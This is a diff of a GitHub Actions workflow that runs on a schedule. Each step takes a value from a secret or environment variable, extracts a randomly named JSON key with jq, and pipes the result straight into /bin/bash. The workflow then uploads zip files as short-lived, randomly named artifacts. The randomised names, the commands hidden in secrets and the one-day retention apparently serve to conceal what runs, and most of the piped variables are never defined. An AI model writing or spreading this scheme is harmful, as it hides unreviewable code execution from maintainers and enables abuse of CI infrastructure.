@@ -1,26 +1,27 @@
 name: yubinrenyu
-
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '5 5/6 * * *'
 
-jobs:  # 29694
+  schedule:
+    - cron: '31 3,9,15,21 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: yubinrenyu
         env:
-          ll46448: ${{ secrets.ll46448 }}
+          p91854: ${{ secrets.p91854 }}
         run: |
-          echo $ll46448 | jq -r .jiwrk497 | /bin/bash
-          echo $fdd006 | jq -r .hcvi4 | /bin/bash
-          echo $t543 | jq -r .hts23 | /bin/bash
-          echo $qtgn0355 | jq -r .lygx620 | /bin/bash
-          echo $ihm66940 | jq -r .ayjev95829 | /bin/bash
-          echo $lryvy71777 | jq -r .mszy4 | /bin/bash
-          echo $njdbc8727 | jq -r .g19 | /bin/bash
-          echo $kkq122 | jq -r .c70200 | /bin/bash
+          printf '%s' "$p91854" | jq -r .an1 | /bin/bash
+          printf '%s' "$oavej3" | jq -r .ejjac62 | /bin/bash
+          echo $qmr01766 | jq -r .ryw66098 | /bin/bash
+          echo $o45033 | jq -r .c3938 | /bin/bash
+          printf '%s' "$fsc38134" | jq -r .bil1 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: Ch3TXmxQ
+          path: "*.zip"
+          retention-days: 1
